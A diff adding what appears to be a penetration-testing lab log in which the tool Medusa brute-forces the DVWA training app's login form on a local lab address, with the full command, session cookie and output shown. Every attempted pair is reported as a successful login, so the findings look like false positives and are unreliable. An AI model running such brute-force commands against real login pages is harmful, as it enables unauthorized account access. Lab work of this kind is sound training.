@@ -1,0 +1,61 @@
+=== CT-08 FINAL: Medusa web-form no DVWA Brute Force ===
+Pagina: /dvwa/vulnerabilities/brute/ (HTTP 200)
+DENY-SIGNAL: incorrect
+FORM-DATA: get?username=&USERNAME&password=&PASSWORD
+Sessao: PHPSESSID=f88179743be35a142db33bde4bd94fa7; security=low
+
+CMD:
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M web-form \
+  -m FORM:/dvwa/vulnerabilities/brute/ \
+  -m DENY-SIGNAL:incorrect \
+  -m FORM-DATA:'get?username=&USERNAME&password=&PASSWORD' \
+  -m CUSTOM-HEADER:'Cookie: PHPSESSID=f88179743be35a142db33bde4bd94fa7; security=low' -t 4
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 0 complete) Password: msfadmin (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: anonymous Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 1 complete) Password: admin (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: anonymous Password: admin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 2 complete) Password: password (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: anonymous Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 3 complete) Password: password (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: anonymous (1 of 6, 4 complete) Password: 123456 (4 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: anonymous Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 5 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 6, 6 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 7 complete) Password: password (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 8 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 9 complete) Password: admin (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: msfadmin Password: admin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (3 of 6, 10 complete) Password: 123456 (4 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: msfadmin Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 11 complete) Password: 123456 (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: root Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 12 complete) Password: password (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: root Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 13 complete) Password: admin (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: root Password: admin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 6, 14 complete) Password: msfadmin (4 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: root Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 15 complete) Password: password (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: user Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 16 complete) Password: msfadmin (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 17 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: user Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (5 of 6, 18 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: user Password: admin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 19 complete) Password: msfadmin (1 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: guest Password: msfadmin [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 20 complete) Password: password (2 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: guest Password: password [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 21 complete) Password: 123456 (3 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: guest Password: 123456 [SUCCESS]
+2026-11-20 01:12:51 ACCOUNT CHECK: [web-form] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (6 of 6, 22 complete) Password: admin (4 of 6 complete)
+2026-11-20 01:12:51 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: guest Password: admin [SUCCESS]
